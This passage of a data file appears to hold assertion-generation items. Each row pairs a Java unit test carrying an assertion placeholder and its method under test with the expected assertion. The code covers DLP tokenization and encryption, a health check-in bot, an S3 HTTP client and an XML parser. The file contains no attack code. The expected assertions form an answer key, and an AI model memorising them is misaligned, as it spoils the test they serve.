asJsonString(T object) { try {  if (object == null) { return """"; }  if (object instanceof MessageOrBuilder) { return convertProtobufMessage((MessageOrBuilder) object); }  if (object instanceof Collection) { return ""["" + ((Collection<?>) object) .stream().map(JsonConvertor::asJsonString).collect(Collectors.joining("","")) + ""]""; }  if (object instanceof Map) { return mapAsJsonString((Map<?, ?>) object); }  return convertJavaBeans(object);  } catch (IOException exp) { logger.atSevere().withCause(exp).log(""Error in converting to Json""); }  return """"; }"	assertThat(jsonValue).isEqualTo(expectedJson)
"parseJson_valueJson_valid() { var protoObj = JsonConvertor.parseJson(""{""stringValue"" : ""sample_text""}"", Value.class);  ProtoTruth.""<AssertPlaceHolder>""; }
parseJson(String json, Class<T> protoClass) { try { var builder = (Message.Builder) protoClass.getMethod(""newBuilder"").invoke(null);  JsonFormat.parser().merge(json, builder); return (T) builder.build(); } catch (Exception exception) { logger.atSevere().withCause(exception).atMostEvery(1, TimeUnit.MINUTES).log( ""error converting json:\n%s"", json); throw new JsonConversionException(""error converting\n"" + json, exception); } }"	"assertThat(protoObj) .ignoringRepeatedFieldOrder() .isEqualTo(Value.newBuilder().setStringValue(""sample_text"").build())"
"convertJsonToAvro_valid() { var testAvroJson = TestResourceLoader.classPath() .loadAsString(""avro_records/contacts_schema/john_doe_contact_plain_avro_record.json"");  var genericRecord = JsonConvertor.convertJsonToAvro(TEST_SCHEMA, testAvroJson);  JsonSubject.""<AssertPlaceHolder>""; }
convertRecordToJson(GenericRecord genericRecord) { var schema = genericRecord.getSchema(); var baos = new ByteArrayOutputStream(); try { var encoder = EncoderFactory.get().jsonEncoder(schema, baos); new GenericDatumWriter<GenericRecord>(schema).write(genericRecord, encoder); encoder.flush(); } catch (IOException ioexp) { throw new JsonConversionException(ioexp); }  return baos.toString(); }"	assertThat(JsonConvertor.convertRecordToJson(genericRecord)) .isEqualTo(testAvroJson)
"makeForMapping_valid() { var configMaker = DeidetifyConfigMaker.of(dlpEncryptConfig); var actualConfig = configMaker.makeForMapping(SCHEMA_KEY_FLAT_KEY_MAP);  GoogleLogger.forEnclosingClass() .atInfo() .log( ""Actual:%s%nExpected:%s"", JsonConvertor.asJsonString(actualConfig), JsonConvertor.asJsonString(expectedConfiguration));  ProtoTruth.""<AssertPlaceHolder>""; }
makeForMapping(Multimap<String, String> columnSchemaKeyMap) {  var fieldTransforms = dlpEncryptConfig.getTransformsList().stream() .map(col -> new FieldTransformMaker(col, columnSchemaKeyMap).make()) .filter( fieldTransformation -> !FieldTransformation.getDefaultInstance().equals(fieldTransformation)) .collect(toImmutableList());  if (fieldTransforms.isEmpty()) { return DeidentifyConfig.getDefaultInstance(); }  return DeidentifyConfig.newBuilder() .setRecordTransformations( RecordTransformations.newBuilder().addAllFieldTransformations(fieldTransforms)) .build(); }"	assertThat(actualConfig) .ignoringRepeatedFieldOrder() .isEqualTo(expectedConfiguration)
"batch_arrayFields_deidConfigContainsOnlyFieldReference() { PartialBatchAccumulator accumulator = PartialBatchAccumulator.withConfig( DlpEncryptConfig.newBuilder() .addTransforms( ColumnTransform.newBuilder() .setColumnId(""$.multi_level_arrays.simple_field1"") .setTransform(CRYPTO_UNWRAPPED_TRANSFORM)) .addTransforms( ColumnTransform.newBuilder() .setColumnId( ""$.multi_level_arrays.level1_array.level1_array_record.level2_simple_field"") .setTransform(CRYPTO_UNWRAPPED_TRANSFORM)) .addTransforms( ColumnTransform.newBuilder() .setColumnId( ""$.multi_level_arrays.level1_array.level1_array_record.level2_array"") .setTransform(CRYPTO_UNWRAPPED_TRANSFORM)) .build());  FlatRecord record = RecordFlattener.forGenericRecord() .flatten( TestResourceLoader.classPath() .forAvro() .withSchemaFile( ""avro_records/records_with_two_levels_of_arrays/two_level_arrays_schema.avsc"") .loadRecord( ""avro_records/records_with_two_levels_of_arrays/simple_two_level_array_record.json""));  accumulator.addElement(record.toBuilder().setRecordId(UUID.randomUUID().toString()).build());  BatchPartialColumnDlpTable batch = accumulator.makeBatch();  ImmutableList<FieldId> deidConfigTokenizeFields = batch .get() .getDeidentifyConfig() .getRecordTransformations() .getFieldTransformationsList() .stream() .map(FieldTransformation::getFieldsList) .flatMap(List::stream) .collect(toImmutableList());  ""<AssertPlaceHolder>""; }
makeBatch() {  var dlpDeidentifyConfig = DeidetifyConfigMaker.of(dlpEncryptConfig()).makeForMapping(columnSchemaKeyMap);  PartialColumnDlpTable tableWithDeidentifyConfig = accumulatedRecords.toBuilder() .setRecordIdColumnName(recordIdColumnName()) .setDeidentifyConfig(dlpDeidentifyConfig) .build();  return BatchPartialColumnDlpTable.create(tableWithDeidentifyConfig); }"	"assertThat(deidConfigTokenizeFields) .containsExactlyElementsIn( DeidentifyColumns.fieldIdsFor( ImmutableList.of( ""$.simple_field1"", ""$.level1_array.[""level1_array_record""].level2_simple_field.string"", ""$.level1_array.[""level1_array_record""].level2_array.string"")))"
"batch_arrayFields_itemTableContainsFlattenedEntries() { PartialBatchAccumulator accumulator = PartialBatchAccumulator.withConfig( DlpEncryptConfig.newBuilder() .addTransforms( ColumnTransform.newBuilder() .setColumnId(""$.multi_level_arrays.simple_field1"") .setTransform(CRYPTO_UNWRAPPED_TRANSFORM)) .addTransforms( ColumnTransform.newBuilder() .setColumnId( ""$.multi_level_arrays.level1_array.level1_array_record.level2_simple_field"") .setTransform(CRYPTO_UNWRAPPED_TRANSFORM)) .addTransforms( ColumnTransform.newBuilder() .setColumnId( ""$.multi_level_arrays.level1_array.level1_array_record.level2_array"") .setTransform(CRYPTO_UNWRAPPED_TRANSFORM)) .build());  FlatRecord record = RecordFlattener.forGenericRecord() .flatten( TestResourceLoader.classPath() .forAvro() .withSchemaFile( ""avro_records/records_with_two_levels_of_arrays/two_level_arrays_schema.avsc"") .loadRecord( ""avro_records/records_with_two_levels_of_arrays/simple_two_level_array_record.json""));  accumulator.addElement(record.toBuilder().setRecordId(UUID.randomUUID().toString()).build());  BatchPartialColumnDlpTable batch = accumulator.makeBatch();  ""<AssertPlaceHolder>""; }
makeBatch() {  var dlpDeidentifyConfig = DeidetifyConfigMaker.of(dlpEncryptConfig()).makeForMapping(columnSchemaKeyMap);  PartialColumnDlpTable tableWithDeidentifyConfig = accumulatedRecords.toBuilder() .setRecordIdColumnName(recordIdColumnName()) .setDeidentifyConfig(dlpDeidentifyConfig) .build();  return BatchPartialColumnDlpTable.create(tableWithDeidentifyConfig); }"	"assertThat(batch.get().getTable().getHeadersList()) .containsExactlyElementsIn( DeidentifyColumns.fieldIdsFor( ImmutableList.of( ""__AUTOTOKENIZE__RECORD_ID__"", ""$.simple_field1"", ""$.level1_array[0].[""level1_array_record""].level2_simple_field.string"", ""$.level1_array[1].[""level1_array_record""].level2_array[1].string"", ""$.level1_array[0].[""level1_array_record""].level2_array[0].string"", ""$.level1_array[0].[""level1_array_record""].level2_array[1].string"", ""$.level1_array[1].[""level1_array_record""].level2_simple_field.string"", ""$.level1_array[1].[""level1_array_record""].level2_array[0].string"")))"
"ValueTokenizingException { ""<AssertPlaceHolder>""; }
encrypt(Value value) throws ValueTokenizingException { try { return BaseEncoding.base64() .encode(encryptCipher.doFinal(value.getStringValue().getBytes(StandardCharsets.UTF_8)));  } catch (GeneralSecurityException securityException) { throw new ValueTokenizingException(""error encrypting value"", securityException); } }"	assertThat(valueTokenizer.encrypt(testValue)).isEqualTo(expectedCipherText)
"ValueTokenizingException { ""<AssertPlaceHolder>""; }
decrypt(String cipherText) throws ValueTokenizingException {  try { var plainText = new String( decryptCipher.doFinal(BaseEncoding.base64().decode(cipherText)), StandardCharsets.UTF_8);  return Value.newBuilder().setStringValue(plainText).build(); } catch (GeneralSecurityException securityException) { throw new ValueTokenizingException(""error decypting value"", securityException); } }"	assertThat(valueTokenizer.decrypt(expectedCipherText)).isEqualTo(testValue)
"ValueTokenizingException { ""<AssertPlaceHolder>""; }
encrypt(Value value) throws ValueTokenizingException { try { return BaseEncoding.base64() .encode(encryptCipher.doFinal(value.getStringValue().getBytes(StandardCharsets.UTF_8)));  } catch (GeneralSecurityException securityException) { throw new ValueTokenizingException(""error encrypting value"", securityException); } }"	assertThat(valueTokenizer.decrypt(valueTokenizer.encrypt(testValue))).isEqualTo(testValue)
"ValueTokenizer.ValueTokenizingException { ""<AssertPlaceHolder>""; }
encrypt(Value value) throws ValueTokenizingException { try { byte[] cipherBytes = deterministicAead.encryptDeterministically(value.toByteArray(), DAEAD_STAMP_BYTES);  return Base64.getEncoder().encodeToString(cipherBytes); } catch (GeneralSecurityException exception) { throw new ValueTokenizingException(""Error encrypting value"", exception); } }"	"assertThat( new DaeadEncryptingValueTokenizer(testEncrypter) .encrypt(Value.newBuilder().setStringValue(""this is sample string"").build())) .isEqualTo(""AWWfEcxShER0JUXMtNDppkQ83xhl4J/ZwU6QL/ExcJz93UD7mWOAxvPoKz8="")"
"encrypt_valid() { ""<AssertPlaceHolder>""; }
encrypt(FlatRecord plainTextRecord) { checkNotNull(tokenizeSchemaKeys, ""tokenizeSchemaKeys should not be null.""); checkNotNull(tokenizerFactory, ""tokenizeFactory should not be null."");  var tokenizer = new FlatRecordTokenizer(tokenizeColumnNameUpdater.updaterFor(plainTextRecord));  ImmutableMap<String, Value> updatedValues = plainTextRecord.getValuesMap().entrySet().stream() .map(tokenizer::processValue) .collect(ImmutableMap.toImmutableMap(ImmutablePair::getLeft, ImmutablePair::getRight));  return FlatRecord.newBuilder().putAllValues(updatedValues).build(); }"	assertThat( EncryptingFlatRecordTokenizer.withTokenizeSchemaKeys(encryptColumns) .withTokenizerFactory(makeTestEncryptor()) .encrypt(testRecord)) .isEqualTo(expectedEncryptedRecord)
"isSubmitTest() { autoCardService.login(USERNAME, PASSWORD); if(autoCardService.isOnline()) Assert.""<AssertPlaceHolder>""; }
getPage() { if (isOnline()) { String page1 = client.doGetText(reportUrl); Boolean formvalidation = appConfig.getConfigItem(""formvalidation"", Boolean.class); if (formvalidation != null && !formvalidation) { return page1; } String page2 = client.doGetText(reportUrl); boolean page1Flag = formValidation(page1); boolean page2Flag = formValidation(page2); if (page1Flag == (page1 != null) && page2Flag == (page2 != null)) { LogUtils.printMessage(""表单校验通过"", LogUtils.Level.INFO); return page1; } else if (page1 != null && page2 != null && page1Flag != page2Flag) { // 意味着两次获取的页面表单是变化的，无法作为校验依据 LogUtils.printMessage(""表单校验功能失效，已忽略校验，请联系作者"", LogUtils.Level.ERROR); return page1; } else { LogUtils.printMessage(""表单校验失败，请检查健康打卡页面是否更新或等待一会再次尝试，若更新请删除缓存文件并重启打卡程序"", LogUtils.Level.ERROR); } } else { LogUtils.printMessage(""用户未登录"", LogUtils.Level.ERROR); } return null; }"	assertEquals(autoCardService.isSubmited(autoCardService.getPage()), true)
"testNoPathOrUrlSet() { s3.query(""number"", ""four"") // .method(HttpMethod.PUT) // .execute(); ""<AssertPlaceHolder>""; }
query(String name, String value) { Preconditions.checkNotNull(name, ""name cannot be null""); Preconditions.checkNotNull(value, ""value cannot be null""); return path("""").query(name, value); }"	"assertEquals(""https://s3.ap-southeast-2.amazonaws.com/?number=four"", hc.endpointUrl.toString())"
"testUrlSet() { s3.url(""https://blah"") // .method(HttpMethod.PUT) // .execute(); ""<AssertPlaceHolder>""; }
url(String url) { Preconditions.checkNotNull(url); return new Request(this, url); }"	"assertEquals(""https://blah"", hc.endpointUrl.toString())"
"testAttribute() { s3.attribute(""colour"", ""blue"") // .attribute(""color"", ""green"") // .method(HttpMethod.PUT) // .execute(); ""<AssertPlaceHolder>""; }
attribute(String name, String value) { Preconditions.checkNotNull(name, ""name cannot be null""); Preconditions.checkNotNull(value, ""value cannot be null""); return path("""").attribute(name, value); }"	"assertEquals( ""https://s3.ap-southeast-2.amazonaws.com/?Attribute.1.Name=colour&Attribute.1.Value=blue&Attribute.2.Name=color&Attribute.2.Value=green"", hc.endpointUrl.toString())"
"testAttributePrefix() { s3.attribute(""colour"", ""blue"") // .attribute(""color"", ""green"") // .attributePrefix(""surface"") // .attribute(""texture"", ""rough"") // .method(HttpMethod.PUT) // .execute(); ""<AssertPlaceHolder>""; }
attribute(String name, String value) { Preconditions.checkNotNull(name, ""name cannot be null""); Preconditions.checkNotNull(value, ""value cannot be null""); return path("""").attribute(name, value); }"	"assertEquals( ""https://s3.ap-southeast-2.amazonaws.com/?Attribute.1.Name=colour&Attribute.1.Value=blue&Attribute.2.Name=color&Attribute.2.Value=green&surface.1.Name=texture&surface.1.Value=rough"", hc.endpointUrl.toString())"
"testAttributePrefix2() { s3.attributePrefix(""surface"") // .attribute(""color"", ""green"") // .method(HttpMethod.PUT) // .execute(); ""<AssertPlaceHolder>""; }
attribute(String name, String value) { Preconditions.checkNotNull(name, ""name cannot be null""); Preconditions.checkNotNull(value, ""value cannot be null""); return path("""").attribute(name, value); }"	"assertEquals( ""https://s3.ap-southeast-2.amazonaws.com/?surface.1.Name=color&surface.1.Value=green"", hc.endpointUrl.toString())"
"InterruptedException { for (int i = 0; i < 10; i++) { Client client = Client // .s3() // .region(""ap-southeast-2"") // .accessKey(""123"") // .secretKey(""456"") // .clock(() -> 1622695846902L) // .connectTimeout(10, TimeUnit.SECONDS) // .readTimeout(10, TimeUnit.SECONDS) // .retryMaxAttempts(1) // .build(); try (Server server = Server.start()) { server.response().body(""<a>hello</a>"").add(); String text = client // .url(server.baseUrl()) // .requestBody(""hi there"") // .responseAsXml() // .content(); // ""<AssertPlaceHolder>""; } } }
url(String url) { Preconditions.checkNotNull(url); return new Request(this, url); }"	"assertEquals(""hello"", text)"
"IOException { Client client = Client // .s3() // .region(""ap-southeast-2"") // .accessKey(""123"") // .secretKey(""456"") // .clock(() -> 1622695846902L) // .build(); try (Server server = Server.start()) { server.response().body(""hello"").statusCode(404).add(); ""<AssertPlaceHolder>""; // } }
url(String url) { Preconditions.checkNotNull(url); return new Request(this, url); }"	assertFalse(client.url(server.baseUrl()).exists())
"IOException { try { Client client = Client // .s3() // .region(""ap-southeast-2"") // .accessKey(""123"") // .secretKey(""456"") // .clock(() -> 1622695846902L) // .build(); try (Server server = Server.start()) { server.response().statusCode(200).add(); String text = client.url(server.baseUrl()) // .method(HttpMethod.PUT) // .requestBody(""hi there"") // .responseAsUtf8(); // ""<AssertPlaceHolder>""; } } catch (Throwable t) { t.printStackTrace(); throw t; } }
url(String url) { Preconditions.checkNotNull(url); return new Request(this, url); }"	"assertEquals("""", text)"
"testRetriesFailTwiceThenSucceed() { Client client = Client // .s3() // .region(""ap-southeast-2"") // .accessKey(""123"") // .secretKey(""456"") // .clock(() -> 1622695846902L) // .retryInitialInterval(100, TimeUnit.MILLISECONDS) // .build(); try (Server server = Server.start()) { server.response().statusCode(408).body(""timed out"").add(); server.response().statusCode(408).body(""timed out"").add(); server.response().statusCode(200).body(""stuff"").add(); String text = client.url(server.baseUrl()) // .method(HttpMethod.PUT) // .requestBody(""hi there"") // .responseAsUtf8(); // ""<AssertPlaceHolder>""; } }
url(String url) { Preconditions.checkNotNull(url); return new Request(this, url); }"	"assertEquals(""stuff"", text)"
"testRetriesFailTwiceThenHitMaxAttempts() { Client client = Client // .s3() // .region(""ap-southeast-2"") // .accessKey(""123"") // .secretKey(""456"") // .clock(() -> 1622695846902L) // .retryInitialInterval(100, TimeUnit.MILLISECONDS) // .retryMaxAttempts(2) // .retryStatusCodes(408) // .build(); try (Server server = Server.start()) { server.response().statusCode(408).body(""timed out"").add(); server.response().statusCode(408).body(""timed out"").add(); server.response().statusCode(200).body(""stuff"").add(); client.url(server.baseUrl()) // .method(HttpMethod.PUT) // .requestBody(""hi there"") // .responseAsUtf8(); // } catch (ServiceException e) { ""<AssertPlaceHolder>""; } }
url(String url) { Preconditions.checkNotNull(url); return new Request(this, url); }"	assertEquals(408, e.statusCode())
"testRetriesFailTwiceThenSucceedGivenIOExceptions() { HttpClientTestingWithQueue hc = new HttpClientTestingWithQueue(); hc.add(new IOException(""boo"")); hc.add(new IOException(""boo2"")); hc.add(createResponseInputStream(200, ""stuff"")); Client client = Client // .s3() // .region(""ap-southeast-2"") // .accessKey(""123"") // .secretKey(""456"") // .clock(() -> 1622695846902L) // .retryInitialInterval(100, TimeUnit.MILLISECONDS) // .retryMaxAttempts(0) // .httpClient(hc) // .build(); String text = client // .path(""myBucket"", ""myObject.txt"") // .responseAsUtf8(); hc.urls().forEach(System.out::println); ""<AssertPlaceHolder>""; }
build() { return new Client(b.clock, b.serviceName, b.region, b.credentials, b.httpClient, b.connectTimeoutMs, b.readTimeoutMs, b.exceptionFactory, b.baseUrlFactory, b.retries); }"	"assertEquals(""stuff"", text)"
"testRetriesFailTwiceThenThrowFinalIOExceptions() { HttpClientTestingWithQueue hc = new HttpClientTestingWithQueue(); hc.add(new IOException(""boo"")); hc.add(new IOException(""boo2"")); hc.add(createResponseInputStream(200, ""stuff"")); Client client = Client // .s3() // .region(""ap-southeast-2"") // .accessKey(""123"") // .secretKey(""456"") // .clock(() -> 1622695846902L) // .retryInitialInterval(100, TimeUnit.MILLISECONDS) // .retryMaxAttempts(2) // .retryBackoffFactor(2.0) // .retryMaxInterval(3, TimeUnit.SECONDS) // .retryJitter(0) // .retryStatusCodes(400) // .retryException(e -> e instanceof IOException && e.getMessage().startsWith(""boo"")) // .httpClient(hc) // .build(); try { client // .path(""myBucket"", ""myObject.txt"") // .responseAsUtf8(); Assert.fail(); } catch (MaxAttemptsExceededException e) { ""<AssertPlaceHolder>""; } }
build() { return new Client(b.clock, b.serviceName, b.region, b.credentials, b.httpClient, b.connectTimeoutMs, b.readTimeoutMs, b.exceptionFactory, b.baseUrlFactory, b.retries); }"	"assertEquals(""boo2"", e.getCause().getMessage())"
"testDontRetryException() { HttpClientTestingWithQueue hc = new HttpClientTestingWithQueue(); hc.add(new IOException(""boo"")); Client client = Client // .s3() // .region(""ap-southeast-2"") // .accessKey(""123"") // .secretKey(""456"") // .clock(() -> 1622695846902L) // .retryInitialInterval(100, TimeUnit.MILLISECONDS) // .retryMaxAttempts(2) // .retryBackoffFactor(2.0) // .retryMaxInterval(3, TimeUnit.SECONDS) // .retryJitter(0) // .retryStatusCodes(400) // .retryException(e -> false) // .httpClient(hc) // .build(); try { client // .path(""myBucket"", ""myObject.txt"") // .responseAsUtf8(); Assert.fail(); } catch (UncheckedIOException e) { ""<AssertPlaceHolder>""; } }
build() { return new Client(b.clock, b.serviceName, b.region, b.credentials, b.httpClient, b.connectTimeoutMs, b.readTimeoutMs, b.exceptionFactory, b.baseUrlFactory, b.retries); }"	"assertEquals(""boo"", e.getCause().getMessage())"
"Exception { HttpClientTestingWithQueue h = new HttpClientTestingWithQueue(); Client s3 = Client // .s3() // .region(""ap-southeast-2"") // .accessKey(""123"") // .secretKey(""456"") // .httpClient(h) // .build(); h.add(startMultipartUpload()); h.add(submitPart1()); h.add(completeMultipartUpload());  try (MultipartOutputStream out = Multipart.s3(s3) // .bucket(""mybucket"") // .key(""mykey"") // .executor(Executors.newFixedThreadPool(1)) // .retryInitialInterval(1, TimeUnit.MILLISECONDS) // .transformCreateRequest(x -> x) // .partSizeMb(5) // s .partTimeout(5, TimeUnit.MINUTES) // .outputStream()) { out.write(0); out.write(new byte[5 * 1024 * 1024 - 1]); } ""<AssertPlaceHolder>""; }
outputStream() { if (b.executor == null) { b.executor = Executors.newCachedThreadPool(); } return new MultipartOutputStream(b.s3, b.bucket, b.key, b.transform, b.executor, b.timeoutMs, b.retries, b.partSize); }"	"assertEquals(Arrays.asList( // ""POST:https://s3.ap-southeast-2.amazonaws.com/mybucket/mykey?uploads"", ""PUT:https://s3.ap-southeast-2.amazonaws.com/mybucket/mykey?partNumber=1&uploadId=abcde"", ""POST:https://s3.ap-southeast-2.amazonaws.com/mybucket/mykey?uploadId=abcde""), // h.urls())"
"testMultipartDefaultExecutor() { HttpClientTestingWithQueue h = new HttpClientTestingWithQueue(); Client s3 = Client // .s3() // .region(""ap-southeast-2"") // .accessKey(""123"") // .secretKey(""456"") // .httpClient(h) // .build(); h.add(startMultipartUpload());  Multipart.s3(s3) // .bucket(""mybucket"") // .key(""mykey"") // .outputStream();  ""<AssertPlaceHolder>""; }
outputStream() { if (b.executor == null) { b.executor = Executors.newCachedThreadPool(); } return new MultipartOutputStream(b.s3, b.bucket, b.key, b.transform, b.executor, b.timeoutMs, b.retries, b.partSize); }"	"assertEquals(Arrays.asList( // ""POST:https://s3.ap-southeast-2.amazonaws.com/mybucket/mykey?uploads""), h.urls())"
"IOException { Map<String, List<String>> headers = new HashMap<>(); headers.put(""content-length"", Collections.singletonList(""3"")); try (ResponseInputStream r = new ResponseInputStream(() ->{}, 200, headers, new ByteArrayInputStream(new byte[] { 1, 2, 3 }))) { ""<AssertPlaceHolder>""; } }
hasBody(ResponseInputStream r) { return r.header(""Content-Length"").isPresent() || r.header(""Transfer-Encoding"").orElse("""").equalsIgnoreCase(""chunked""); }"	assertTrue(Request.hasBody(r))
"IOException { Map<String, List<String>> headers = new HashMap<>(); headers.put(""transfer-encoding"", Collections.singletonList(""chunkeD"")); try (ResponseInputStream r = new ResponseInputStream(() ->{}, 200, headers, new ByteArrayInputStream(new byte[] { 1, 2, 3 }))) { ""<AssertPlaceHolder>""; } }
hasBody(ResponseInputStream r) { return r.header(""Content-Length"").isPresent() || r.header(""Transfer-Encoding"").orElse("""").equalsIgnoreCase(""chunked""); }"	assertTrue(Request.hasBody(r))
"IOException { Map<String, List<String>> headers = new HashMap<>(); try (ResponseInputStream r = new ResponseInputStream(() ->{}, 200, headers, new ByteArrayInputStream(new byte[] { 1, 2, 3 }))) { ""<AssertPlaceHolder>""; } }
hasBody(ResponseInputStream r) { return r.header(""Content-Length"").isPresent() || r.header(""Transfer-Encoding"").orElse("""").equalsIgnoreCase(""chunked""); }"	assertFalse(Request.hasBody(r))
"testResponseCodeOk() { Response r = new Response(Collections.emptyMap(), new byte[0], 210); ""<AssertPlaceHolder>""; }
isOk() { return statusCode >= 200 && statusCode <= 299; }"	assertTrue(r.isOk())
"testResponseCode199() { Response r = new Response(Collections.emptyMap(), new byte[0], 199); ""<AssertPlaceHolder>""; }
isOk() { return statusCode >= 200 && statusCode <= 299; }"	assertTrue(!r.isOk())
"testResponseCode300() { Response r = new Response(Collections.emptyMap(), new byte[0], 300); ""<AssertPlaceHolder>""; }
isOk() { return statusCode >= 200 && statusCode <= 299; }"	assertTrue(!r.isOk())
"testExists200() { Response r = new Response(Collections.emptyMap(), new byte[0], 200); ""<AssertPlaceHolder>""; }
exists() { if (statusCode >= 200 && statusCode <= 299) { return true; } else if (statusCode == HttpURLConnection.HTTP_NOT_FOUND) { return false; } else { throw new ServiceException(statusCode, ""call failed""); } }"	assertTrue(r.exists())
"testExists299() { Response r = new Response(Collections.emptyMap(), new byte[0], 299); ""<AssertPlaceHolder>""; }
exists() { if (statusCode >= 200 && statusCode <= 299) { return true; } else if (statusCode == HttpURLConnection.HTTP_NOT_FOUND) { return false; } else { throw new ServiceException(statusCode, ""call failed""); } }"	assertTrue(r.exists())
"testExists404() { Response r = new Response(Collections.emptyMap(), new byte[0], 404); ""<AssertPlaceHolder>""; }
exists() { if (statusCode >= 200 && statusCode <= 299) { return true; } else if (statusCode == HttpURLConnection.HTTP_NOT_FOUND) { return false; } else { throw new ServiceException(statusCode, ""call failed""); } }"	assertFalse(r.exists())
"testGet() { String key = System.getenv().keySet().stream().findFirst().get(); ""<AssertPlaceHolder>""; }
get(String name) { return System.getenv(name); }"	assertNotNull(EnvironmentDefault.INSTANCE.get(key))
"MalformedURLException { ""<AssertPlaceHolder>""; }
getCanonicalizedResourcePath(URL endpoint) { Preconditions.checkNotNull(endpoint); String path = endpoint.getPath(); if (path.isEmpty()) { return ""/""; } else { return Util.urlEncode(path, true); } }"	"assertEquals(""/"", getCanonicalizedResourcePath(new URL(""https://"")))"
"MalformedURLException { ""<AssertPlaceHolder>""; }
getCanonicalizedResourcePath(URL endpoint) { Preconditions.checkNotNull(endpoint); String path = endpoint.getPath(); if (path.isEmpty()) { return ""/""; } else { return Util.urlEncode(path, true); } }"	"assertEquals(""/hi"", getCanonicalizedResourcePath(new URL(""https://blah.com/hi"")))"
"testReadAndClose() { byte[] b = ""hi there"".getBytes(StandardCharsets.UTF_8); ByteArrayInputStream in = new ByteArrayInputStream(b); ""<AssertPlaceHolder>""; }
readBytesAndClose(InputStream in) { try { byte[] buffer = new byte[8192]; int n; ByteArrayOutputStream bytes = new ByteArrayOutputStream(); while ((n = in.read(buffer)) != -1) { bytes.write(buffer, 0, n); } return bytes.toByteArray(); } catch (IOException e) { throw new UncheckedIOException(e); } finally { try { in.close(); } catch (IOException e) { throw new UncheckedIOException(e); } } }"	assertArrayEquals(b, Util.readBytesAndClose(in))
"testReadAndCloseReadThrows() { AtomicBoolean closed = new AtomicBoolean(); InputStream in = new InputStream() {  @Override public int read() throws IOException { throw new IOException(""boo""); }  @Override public void close() { closed.set(true); } }; try { Util.readBytesAndClose(in); Assert.fail(); } catch (UncheckedIOException e) { // expected ""<AssertPlaceHolder>""; } }
readBytesAndClose(InputStream in) { try { byte[] buffer = new byte[8192]; int n; ByteArrayOutputStream bytes = new ByteArrayOutputStream(); while ((n = in.read(buffer)) != -1) { bytes.write(buffer, 0, n); } return bytes.toByteArray(); } catch (IOException e) { throw new UncheckedIOException(e); } finally { try { in.close(); } catch (IOException e) { throw new UncheckedIOException(e); } } }"	assertTrue(closed.get())
"testWithPreamble() { XmlElement x = XmlElement.parse(""<?xml>\n<a/>""); ""<AssertPlaceHolder>""; }
name() { return this.name; }"	"assertEquals(""a"", x.name())"
"testLineNumber() { try { XmlElement.parse(""<?xml>\n\n\n<a>""); } catch (XmlParseException e) { ""<AssertPlaceHolder>""; } }
lineNumber() { return this.lineNr; }"	assertEquals(4, e.lineNumber())
"testWithPreamble7() { XmlElement x = XmlElement.parse(""<?xml<>\n<a/>""); ""<AssertPlaceHolder>""; }
name() { return this.name; }"	"assertEquals(""a"", x.name())"
"testWithPreamble2() { XmlElement x = XmlElement.parse(""<?[xml]>\n<a/>""); ""<AssertPlaceHolder>""; }
name() { return this.name; }"	"assertEquals(""a"", x.name())"
"testWithPreamble3() { XmlElement x = XmlElement.parse(""<?-xml>\n<a/>""); ""<AssertPlaceHolder>""; }
name() { return this.name; }"	"assertEquals(""a"", x.name())"
"testWithPreamble4() { XmlElement x = XmlElement.parse(""<?--xml-->\n<a/>""); ""<AssertPlaceHolder>""; }
name() { return this.name; }"	"assertEquals(""a"", x.name())"
"testWithPreamble5() { XmlElement x = XmlElement.parse(""<?-[xml*]>\n<a/>""); ""<AssertPlaceHolder>""; }
name() { return this.name; }"	"assertEquals(""a"", x.name())"
"testWithPreamble6() { XmlElement x = XmlElement.parse(""<?-]xml>\n<a/>""); ""<AssertPlaceHolder>""; }
name() { return this.name; }"	"assertEquals(""a"", x.name())"
"testWithPreambleAndVersionDoubleQuote() { XmlElement x = XmlElement.parse(""<?XML version=""1.0""?><a/>""); ""<AssertPlaceHolder>""; }
name() { return this.name; }"	"assertEquals(""a"", x.name())"
"testWithPreambleAndVersionSingleQuote() { XmlElement x = XmlElement.parse(""<?XML version='1.0'?><a/>""); ""<AssertPlaceHolder>""; }
name() { return this.name; }"	"assertEquals(""a"", x.name())"
"testWithPreambleAndDocType() { XmlElement x = XmlElement.parse(""<?XML version=""1.0""?>\n"" + ""<!DOCTYPE greeting SYSTEM ""hello.dtd"">\n"" + ""<a>Hello, world!</a>""); ""<AssertPlaceHolder>""; }
name() { return this.name; }"	"assertEquals(""a"", x.name())"
"testWithPreambleAndDocType2() { XmlElement x = XmlElement .parse(""<?XML version=""1.0"" encoding=""UTF-8"" ?>\n"" + ""<!DOCTYPE greeting [\n"" + ""  <!ELEMENT greeting (#PCDATA)>\n"" + ""]>\n"" + ""<a>Hello, world!</a>""); ""<AssertPlaceHolder>""; }
name() { return this.name; }"	"assertEquals(""a"", x.name())"
"testSyntaxGoodEntity() { XmlElement x = XmlElement.parse(""<a>&#100;</a>""); ""<AssertPlaceHolder>""; }
content() { return this.content; }"	"assertEquals(""d"", x.content())"
"testSyntaxGoodEntityFollowedByComment() { XmlElement x = XmlElement.parse(""<a>&#100;<!-- boo --></a>""); ""<AssertPlaceHolder>""; }
content() { return this.content; }"	"assertEquals(""d"", x.content())"
"testWriter() { XmlElement x = XmlElement.parse(""<a/>""); ""<AssertPlaceHolder>""; }
toString() { ByteArrayOutputStream out = new ByteArrayOutputStream(); OutputStreamWriter writer = new OutputStreamWriter(out, StandardCharsets.UTF_8); writeUnchecked(writer); return new String(out.toByteArray(), StandardCharsets.UTF_8); }"	"assertEquals(""<a/>"", x.toString())"
"testComment2() { XmlElement x = XmlElement.parse(""<a><b>boo</b><!-- hi there --></a>""); ""<AssertPlaceHolder>""; }
countChildren() { return children.size(); }"	assertEquals(1, x.countChildren())
"IOException { try (StringReader reader = new StringReader(""<a> hi </a>"")) { XmlElement x = XmlElement.parse(reader); ""<AssertPlaceHolder>""; } }
content() { return this.content; }"	"assertEquals(""hi"", x.content())"
"testComment() { XmlElement x = XmlElement.parse(""<a><!-- hi there -->boo</a>""); ""<AssertPlaceHolder>""; }
content() { return this.content; }"	"assertEquals(""boo"", x.content())"
"testComment3() { XmlElement x = XmlElement.parse(""<a><![hi there]>boo</a>""); ""<AssertPlaceHolder>""; }
content() { return this.content; }"	"assertEquals(""boo"", x.content())"
